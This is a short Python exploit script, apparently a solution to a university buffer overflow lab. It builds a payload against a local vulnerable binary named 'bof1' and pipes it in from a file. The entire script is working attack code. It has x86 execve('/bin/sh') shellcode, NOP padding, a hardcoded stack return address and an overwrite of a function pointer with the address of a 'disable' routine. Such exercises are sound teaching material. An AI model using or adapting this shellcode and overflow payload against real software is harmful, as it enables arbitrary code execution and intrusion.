import struct
import os

#QUESTO ESERCIZIO NON DEVE IMPLEMENTARE LO SHELLCODE!!!

str_fp = 263
disable = 0x804852b

dst_eip = 116
canary_eip =  16
dst = 0xbffff048 #0xbfffeff8 
shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80") 
nop = '\x90'

atk_vector = shellcode
atk_vector += nop*(dst_eip-len(atk_vector))
atk_vector += struct.pack("I", dst)
atk_vector += "A"*(str_fp-len(atk_vector))
atk_vector += struct.pack("I", disable)

f = open("badfile", "w+")
f.write("%s" %atk_vector)
f.close()

os.system("cat {} | ./bof1".format('badfile'))
